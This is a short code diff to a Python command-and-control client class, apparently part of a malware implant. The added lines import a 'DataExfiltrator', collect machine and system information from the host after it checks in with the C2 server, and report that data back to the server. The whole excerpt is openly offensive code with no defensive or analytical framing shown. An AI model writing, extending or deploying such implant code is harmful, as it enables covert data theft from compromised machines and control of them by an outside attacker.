@@ -4,6 +4,7 @@ import subprocess
 import getpass
 import os
 import re
+from exfiltrate_data import DataExfiltrator
 
 class C2Client:
     def __init__(self, server_url):
@@ -33,6 +34,12 @@ class C2Client:
                     f.write(self.client_id)
                 
             print(response_data)
+            
+            exfiltrator = DataExfiltrator()
+            exfiltrator.gather_machine_info()
+            exfiltrator.gather_system_info()
+            self.report("SUCCESS", exfiltrator.get_data())
+            
         except Exception:
             raise Exception
 
